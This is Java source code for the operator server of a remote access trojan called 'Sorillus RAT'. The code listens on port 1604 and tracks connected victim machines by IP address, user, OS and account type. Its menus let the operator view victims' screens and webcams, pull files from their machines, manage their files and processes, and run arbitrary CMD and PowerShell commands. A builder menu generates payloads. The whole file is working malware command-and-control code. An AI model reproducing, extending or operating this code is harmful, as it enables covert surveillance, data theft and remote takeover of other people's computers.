package com.sorillus.rat;

import com.formdev.flatlaf.FlatDarkLaf;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.util.HashMap;
import java.util.Map;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import org.json.JSONObject;
import org.json.JSONArray;

public class Server {
    private static JFrame frame;
    private static DefaultTableModel tableModel;
    private static JTable userTable;
    private static Map<String, ClientHandler> clients = new HashMap<>();
    private static final String CLIENTS_FILE = "clients.json";

    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("Failed to set FlatLaf: " + e.getMessage());
        }

        frame = new JFrame("Sorillus RAT Server");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(800, 600);
        frame.setLayout(new BorderLayout(10, 10));

        frame.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                saveClientsToFile();
                for (ClientHandler client : clients.values()) {
                    try {
                        client.close();
                    } catch (IOException e) {
                        System.err.println("Error closing client " + client.getClientId() + ": " + e.getMessage());
                    }
                }
            }
        });

        JMenuBar menuBar = new JMenuBar();
        JMenu fileMenu = new JMenu("File");
        JMenu settingsMenu = new JMenu("Settings");
        JMenu builderMenu = new JMenu("Builder");
        JMenu aboutMenu = new JMenu("About");

        fileMenu.add(new JMenuItem("Exit"));
        settingsMenu.add(new JMenuItem("Preferences"));
        aboutMenu.add(new JMenuItem("About Sorillus RAT"));

        JMenuItem generatePayloadItem = new JMenuItem("Generate Payload");
        generatePayloadItem.addActionListener(e -> new BuilderWindow());
        builderMenu.add(generatePayloadItem);

        menuBar.add(fileMenu);
        menuBar.add(settingsMenu);
        menuBar.add(builderMenu);
        menuBar.add(aboutMenu);
        frame.setJMenuBar(menuBar);

        String[] columnNames = {"Client ID", "IP Address", "Tag", "User@PC", "Version", "Status", "User Status", "Country", "Operating System", "Account Type"};
        tableModel = new DefaultTableModel(columnNames, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return column == 2;
            }
        };
        userTable = new JTable(tableModel);
        userTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        userTable.setRowHeight(25);
        userTable.setFont(new Font("Segoe UI", Font.PLAIN, 14));

        JPopupMenu popupMenu = new JPopupMenu();
        JMenuItem screenViewerItem = new JMenuItem("Screen Viewer");
        JMenuItem fileLoadItem = new JMenuItem("File Load");
        JMenuItem fileManagerItem = new JMenuItem("File Manager");
        JMenuItem webcamViewerItem = new JMenuItem("Webcam Viewer");
        JMenuItem cmdExecuteItem = new JMenuItem("Execute CMD");
        JMenuItem psExecuteItem = new JMenuItem("Execute PowerShell");
        JMenuItem taskManagerItem = new JMenuItem("Task Manager");

        screenViewerItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new ScreenViewer(client);
                }
            }
        });

        fileLoadItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    client.requestFile();
                }
            }
        });

        fileManagerItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new FileManager(client);
                }
            }
        });

        webcamViewerItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new WebcamViewer(client);
                }
            }
        });

        cmdExecuteItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    JTextField commandField = new JTextField(30);
                    JPanel panel = new JPanel(new BorderLayout());
                    panel.add(new JLabel("Enter CMD command for client " + clientId + ":"), BorderLayout.NORTH);
                    panel.add(commandField, BorderLayout.CENTER);
                    int result = JOptionPane.showConfirmDialog(frame, panel, "Execute CMD", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
                    if (result == JOptionPane.OK_OPTION) {
                        String command = commandField.getText();
                        if (command != null && !command.trim().isEmpty()) {
                            client.sendCommand("CMD_EXECUTE:" + command);
                        }
                    }
                }
            }
        });

        psExecuteItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    JTextField commandField = new JTextField(30);
                    JPanel panel = new JPanel(new BorderLayout());
                    panel.add(new JLabel("Enter PowerShell command for client " + clientId + ":"), BorderLayout.NORTH);
                    panel.add(commandField, BorderLayout.CENTER);
                    int result = JOptionPane.showConfirmDialog(frame, panel, "Execute PowerShell", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
                    if (result == JOptionPane.OK_OPTION) {
                        String command = commandField.getText();
                        if (command != null && !command.trim().isEmpty()) {
                            client.sendCommand("POWERSHELL_EXECUTE:" + command);
                        }
                    }
                }
            }
        });

        taskManagerItem.addActionListener(e -> {
            int selectedRow = userTable.getSelectedRow();
            if (selectedRow != -1) {
                String clientId = (String) tableModel.getValueAt(selectedRow, 0);
                ClientHandler client = clients.get(clientId);
                if (client != null) {
                    new TaskManager(client);
                }
            }
        });

        popupMenu.add(screenViewerItem);
        popupMenu.add(fileLoadItem);
        popupMenu.add(fileManagerItem);
        popupMenu.add(webcamViewerItem);
        popupMenu.add(cmdExecuteItem);
        popupMenu.add(psExecuteItem);
        popupMenu.add(taskManagerItem);
        userTable.setComponentPopupMenu(popupMenu);

        JScrollPane tableScrollPane = new JScrollPane(userTable);
        frame.add(tableScrollPane, BorderLayout.CENTER);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        loadClientsFromFile();

        try {
            ServerSocket serverSocket = new ServerSocket(1604);
            System.out.println("Server started on port 1604...");
            System.out.println("Server IP: " + InetAddress.getLocalHost().getHostAddress());

            while (true) {
                Socket commandSocket = serverSocket.accept();
                Socket screenshotSocket = serverSocket.accept();
                Socket webcamSocket = serverSocket.accept();

                String clientIP = commandSocket.getInetAddress().getHostAddress();
                System.out.println("Client connected: " + clientIP);

                DataInputStream dataInputStream = new DataInputStream(commandSocket.getInputStream());
                String clientIdLine = dataInputStream.readUTF();
                String clientId = clientIdLine.startsWith("CLIENT_ID:") ? clientIdLine.split(":")[1] : "UNKNOWN";
                System.out.println("Received client ID: " + clientId);

                if (clients.containsKey(clientId)) {
                    ClientHandler oldClient = clients.get(clientId);
                    try {
                        oldClient.close();
                    } catch (IOException e) {
                        System.err.println("Error closing old connection for " + clientId + ": " + e.getMessage());
                    }
                    updateClientInTable(clientId, clientIP);
                    showNotification("Client reconnected: " + clientId + " (" + clientIP + ")", false);
                } else {
                    addClientToTable(clientId, clientIP);
                    showNotification("New client connected: " + clientId + " (" + clientIP + ")", true);
                }

                ClientHandler clientHandler = new ClientHandler(commandSocket, screenshotSocket, webcamSocket, clientId, clientIP);
                clients.put(clientId, clientHandler);

                new Thread(clientHandler).start();
            }
        } catch (IOException e) {
            System.err.println("Server error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void showConsoleOutput(String title, String output) {
        JDialog dialog = new JDialog(frame, title, true);
        dialog.setSize(600, 400);
        dialog.setLayout(new BorderLayout());

        JTextArea outputArea = new JTextArea();
        outputArea.setText(output);
        outputArea.setEditable(false);
        outputArea.setBackground(Color.BLACK);
        outputArea.setForeground(Color.WHITE);
        outputArea.setFont(new Font("Consolas", Font.PLAIN, 14));
        outputArea.setCaretPosition(0); // Start at top
        outputArea.setLineWrap(true);
        outputArea.setWrapStyleWord(true);

        JScrollPane scrollPane = new JScrollPane(outputArea);
        dialog.add(scrollPane, BorderLayout.CENTER);

        JButton closeButton = new JButton("Close");
        closeButton.addActionListener(e -> dialog.dispose());
        JPanel buttonPanel = new JPanel();
        buttonPanel.add(closeButton);
        dialog.add(buttonPanel, BorderLayout.SOUTH);

        dialog.setLocationRelativeTo(frame);
        dialog.setVisible(true);
    }

    private static void showNotification(String message, boolean isNewConnection) {
        SwingUtilities.invokeLater(() -> {
            JWindow notification = new JWindow();
            notification.setAlwaysOnTop(true);
            notification.setLayout(new BorderLayout());

            JLabel label = new JLabel(message, SwingConstants.CENTER);
            label.setFont(new Font("Segoe UI", Font.PLAIN, 12));
            label.setForeground(Color.WHITE);
            label.setOpaque(true);
            label.setBackground(isNewConnection ? new Color(40, 167, 69) : new Color(255, 193, 7));
            label.setBorder(BorderFactory.createEmptyBorder(5, 10, 5, 10));

            notification.add(label, BorderLayout.CENTER);
            notification.pack();

            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            Rectangle screenBounds = ge.getMaximumWindowBounds();
            int x = (int) (screenBounds.width - notification.getWidth() - 10);
            int y = (int) (screenBounds.height - notification.getHeight() - 10);
            notification.setLocation(x, y);

            notification.setVisible(true);

            new Thread(() -> {
                try {
                    Thread.sleep(3000);
                    SwingUtilities.invokeLater(notification::dispose);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();
        });
    }

    private static void addClientToTable(String clientId, String ipAddress) {
        tableModel.addRow(new Object[]{
                clientId, ipAddress, "DEBUG", "User@PC", "1.0", "Connected", "Active", "", "Windows 10 Pro 64 Bit", "Admin"
        });
        System.out.println("Added client to table: " + clientId + " (" + ipAddress + ")");
    }

    private static void updateClientInTable(String clientId, String ipAddress) {
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            if (tableModel.getValueAt(i, 0).equals(clientId)) {
                tableModel.setValueAt(ipAddress, i, 1);
                tableModel.setValueAt("Connected", i, 5);
                tableModel.setValueAt("Active", i, 6);
                System.out.println("Updated client in table: " + clientId + " (" + ipAddress + ")");
                return;
            }
        }
        addClientToTable(clientId, ipAddress);
    }

    private static void saveClientsToFile() {
        try {
            JSONArray clientsArray = new JSONArray();
            for (int i = 0; i < tableModel.getRowCount(); i++) {
                JSONObject clientJson = new JSONObject();
                clientJson.put("clientId", tableModel.getValueAt(i, 0));
                clientJson.put("ipAddress", tableModel.getValueAt(i, 1));
                clientJson.put("tag", tableModel.getValueAt(i, 2));
                clientJson.put("userAtPc", tableModel.getValueAt(i, 3));
                clientJson.put("version", tableModel.getValueAt(i, 4));
                clientJson.put("status", tableModel.getValueAt(i, 5));
                clientJson.put("userStatus", tableModel.getValueAt(i, 6));
                clientJson.put("country", tableModel.getValueAt(i, 7));
                clientJson.put("os", tableModel.getValueAt(i, 8));
                clientJson.put("accountType", tableModel.getValueAt(i, 9));
                clientsArray.put(clientJson);
            }

            try (FileWriter file = new FileWriter(CLIENTS_FILE)) {
                file.write(clientsArray.toString(4));
                System.out.println("Saved clients to " + CLIENTS_FILE);
            }
        } catch (Exception e) {
            System.err.println("Error saving clients to file: " + e.getMessage());
        }
    }

    private static void loadClientsFromFile() {
        try {
            File file = new File(CLIENTS_FILE);
            if (!file.exists()) {
                System.out.println("No saved clients file found.");
                return;
            }

            StringBuilder content = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }
            }

            JSONArray clientsArray = new JSONArray(content.toString());
            for (int i = 0; i < clientsArray.length(); i++) {
                JSONObject clientJson = clientsArray.getJSONObject(i);
                String clientId = clientJson.getString("clientId");
                String ipAddress = clientJson.getString("ipAddress");
                tableModel.addRow(new Object[]{
                        clientId,
                        ipAddress,
                        clientJson.getString("tag"),
                        clientJson.getString("userAtPc"),
                        clientJson.getString("version"),
                        "Disconnected",
                        clientJson.getString("userStatus"),
                        clientJson.getString("country"),
                        clientJson.getString("os"),
                        clientJson.getString("accountType")
                });
                System.out.println("Loaded client from file: " + clientId + " (" + ipAddress + ")");
            }
        } catch (Exception e) {
            System.err.println("Error loading clients from file: " + e.getMessage());
        }
    }

    static class ClientHandler implements Runnable {
        private final Socket commandSocket;
        private final Socket screenshotSocket;
        private final Socket webcamSocket;
        private final String clientId;
        private final String ipAddress;
        private PrintWriter writer;
        private ScreenViewer screenViewer;
        private FileManager fileManager;
        private TaskManager taskManager;
        private WebcamViewer webcamViewer;
        private boolean receivingFile = false;
        private long fileSize = 0;
        private String fileName;
        private FileOutputStream fos;
        private volatile boolean running = true;
        private volatile boolean screenshotThreadRunning = false;
        private volatile boolean webcamThreadRunning = false;

        public ClientHandler(Socket commandSocket, Socket screenshotSocket, Socket webcamSocket, String clientId, String ipAddress) {
            this.commandSocket = commandSocket;
            this.screenshotSocket = screenshotSocket;
            this.webcamSocket = webcamSocket;
            this.clientId = clientId;
            this.ipAddress = ipAddress;
            try {
                this.writer = new PrintWriter(commandSocket.getOutputStream(), true);
            } catch (IOException e) {
                System.err.println("Error initializing writer for " + clientId + ": " + e.getMessage());
            }
        }

        public String getClientId() {
            return clientId;
        }

        public String getIpAddress() {
            return ipAddress;
        }

        public void setScreenViewer(ScreenViewer screenViewer) {
            this.screenViewer = screenViewer;
            if (screenViewer != null && !screenshotThreadRunning) {
                System.out.println("Starting screenshot thread for client: " + clientId);
                startScreenshotThread();
            } else if (screenViewer == null) {
                System.out.println("Stopping screenshot thread for client: " + clientId);
                screenshotThreadRunning = false;
            }
        }

        public void setFileManager(FileManager fileManager) {
            this.fileManager = fileManager;
        }

        public void setTaskManager(TaskManager taskManager) {
            this.taskManager = taskManager;
        }

        public void setWebcamViewer(WebcamViewer webcamViewer) {
            this.webcamViewer = webcamViewer;
            if (webcamViewer != null && !webcamThreadRunning) {
                System.out.println("Starting webcam thread for client: " + clientId);
                startWebcamThread();
            } else if (webcamViewer == null) {
                System.out.println("Stopping webcam thread for client: " + clientId);
                webcamThreadRunning = false;
            }
        }

        public OutputStream getCommandOutputStream() throws IOException {
            return commandSocket.getOutputStream();
        }

        public InputStream getCommandInputStream() throws IOException {
            return commandSocket.getInputStream();
        }

        public InputStream getScreenshotInputStream() throws IOException {
            return screenshotSocket.getInputStream();
        }

        public InputStream getWebcamInputStream() throws IOException {
            return webcamSocket.getInputStream();
        }

        public void sendCommand(String command) {
            if (writer != null) {
                System.out.println("Sending command to client " + clientId + ": " + command);
                writer.println(command);
                writer.flush();
            } else {
                System.err.println("Writer is null, cannot send command: " + command);
            }
        }

        public void requestFile() {
            String filePath = JOptionPane.showInputDialog(frame, "Enter file path to download from client " + ipAddress + ":", "File Load", JOptionPane.PLAIN_MESSAGE);
            if (filePath != null && !filePath.trim().isEmpty()) {
                sendCommand("FILE_REQUEST:" + filePath);
                receivingFile = true;
            }
        }

        public void close() throws IOException {
            running = false;
            screenshotThreadRunning = false;
            webcamThreadRunning = false;
            if (commandSocket != null && !commandSocket.isClosed()) {
                commandSocket.close();
            }
            if (screenshotSocket != null && !screenshotSocket.isClosed()) {
                screenshotSocket.close();
            }
            if (webcamSocket != null && !webcamSocket.isClosed()) {
                webcamSocket.close();
            }
        }

        private void startScreenshotThread() {
            screenshotThreadRunning = true;
            new Thread(() -> {
                try {
                    DataInputStream screenshotStream = new DataInputStream(screenshotSocket.getInputStream());
                    while (running && screenshotThreadRunning) {
                        System.out.println("Waiting for screenshot data from client: " + clientId);
                        int imageSize = screenshotStream.readInt();
                        System.out.println("Received screenshot size: " + imageSize + " bytes");
                        byte[] imageBytes = new byte[imageSize];
                        screenshotStream.readFully(imageBytes);
                        ByteArrayInputStream bais = new ByteArrayInputStream(imageBytes);
                        BufferedImage screenshot = ImageIO.read(bais);
                        if (screenshot != null && screenViewer != null) {
                            System.out.println("Updating screenshot in ScreenViewer for client: " + clientId);
                            screenViewer.updateScreenshot(screenshot);
                        }
                    }
                } catch (IOException e) {
                    System.err.println("Error in screenshot thread for " + clientId + ": " + e.getMessage());
                } finally {
                    screenshotThreadRunning = false;
                }
            }).start();
        }

        private void startWebcamThread() {
            webcamThreadRunning = true;
            new Thread(() -> {
                try {
                    DataInputStream webcamStream = new DataInputStream(webcamSocket.getInputStream());
                    while (running && webcamThreadRunning) {
                        System.out.println("Waiting for webcam frame from client: " + clientId);
                        int frameSize = webcamStream.readInt();
                        System.out.println("Received webcam frame size: " + frameSize + " bytes");
                        byte[] frameBytes = new byte[frameSize];
                        webcamStream.readFully(frameBytes);
                        ByteArrayInputStream bais = new ByteArrayInputStream(frameBytes);
                        BufferedImage frameImage = ImageIO.read(bais);
                        if (frameImage != null && webcamViewer != null) {
                            System.out.println("Updating webcam frame in WebcamViewer for client: " + clientId);
                            webcamViewer.updateWebcamFrame(frameImage);
                        }
                    }
                } catch (IOException e) {
                    System.err.println("Error in webcam thread for " + clientId + ": " + e.getMessage());
                } finally {
                    webcamThreadRunning = false;
                }
            }).start();
        }

        @Override
        public void run() {
            try {
                DataInputStream dataInputStream = new DataInputStream(commandSocket.getInputStream());
                while (running) {
                    if (dataInputStream.available() > 0) {
                        String response = dataInputStream.readUTF();
                        System.out.println("Received response from client " + clientId + ": " + response);
                        if (response.startsWith("WEBCAM_LIST:")) {
                            if (webcamViewer != null) {
                                System.out.println("Updating webcam list for client: " + clientId);
                                webcamViewer.updateWebcamList(response);
                            }
                        } else if (response.startsWith("WEBCAM_ERROR:")) {
                            if (webcamViewer != null) {
                                webcamViewer.handleWebcamError(response.substring(13));
                            }
                        } else if (response.startsWith("FILE_SIZE:") && receivingFile) {
                            fileSize = Long.parseLong(response.split(":")[1]);
                            response = dataInputStream.readUTF();
                            if (response.startsWith("FILE_NAME:")) {
                                fileName = response.split(":")[1];
                                fos = new FileOutputStream("downloaded_" + fileName);
                                byte[] buffer = new byte[1024];
                                long bytesRead = 0;
                                int count;
                                while (bytesRead < fileSize && (count = dataInputStream.read(buffer, 0, (int) Math.min(buffer.length, fileSize - bytesRead))) != -1) {
                                    fos.write(buffer, 0, count);
                                    bytesRead += count;
                                }
                                fos.close();
                                JOptionPane.showMessageDialog(frame, "File downloaded: " + fileName, "Success", JOptionPane.INFORMATION_MESSAGE);
                                receivingFile = false;
                            }
                        } else if (response.startsWith("SCREEN_SIZE:")) {
                            String[] parts = response.split(":");
                            int width = Integer.parseInt(parts[1]);
                            int height = Integer.parseInt(parts[2]);
                            if (screenViewer != null) {
                                screenViewer.setClientScreenSize(width, height);
                            }
                        } else if (response.startsWith("CMD_RESULT:") || response.startsWith("CMD_ERROR:")) {
                            String result = response.startsWith("CMD_RESULT:") ? response.substring(11) : response.substring(10);
                            SwingUtilities.invokeLater(() -> showConsoleOutput("CMD Output - Client " + clientId, result));
                        } else if (response.startsWith("POWERSHELL_RESULT:") || response.startsWith("POWERSHELL_ERROR:")) {
                            String result = response.startsWith("POWERSHELL_RESULT:") ? response.substring(18) : response.substring(17);
                            SwingUtilities.invokeLater(() -> showConsoleOutput("PowerShell Output - Client " + clientId, result));
                        } else if (response.startsWith("PROCESS_LIST:") && taskManager != null) {
                            taskManager.handleProcessList(response);
                        } else if (response.startsWith("KILL_SUCCESS:") && taskManager != null) {
                            taskManager.handleKillResponse(response);
                        } else if (response.startsWith("KILL_ERROR:") && taskManager != null) {
                            taskManager.handleKillResponse(response);
                        } else if (fileManager != null && fileManager.isWaitingForResponse()) {
                            fileManager.handleResponse(response);
                        }
                    }
                    Thread.sleep(100);
                }
            } catch (Exception e) {
                System.err.println("Error in ClientHandler for " + clientId + ": " + e.getMessage());
                updateClientInTable(clientId, ipAddress, "Disconnected");
            }
        }

        private void updateClientInTable(String clientId, String ipAddress, String status) {
            for (int i = 0; i < tableModel.getRowCount(); i++) {
                if (tableModel.getValueAt(i, 0).equals(clientId)) {
                    tableModel.setValueAt(status, i, 5);
                    System.out.println("Updated client status in table: " + clientId + " (" + status + ")");
                    break;
                }
            }
        }
    }
}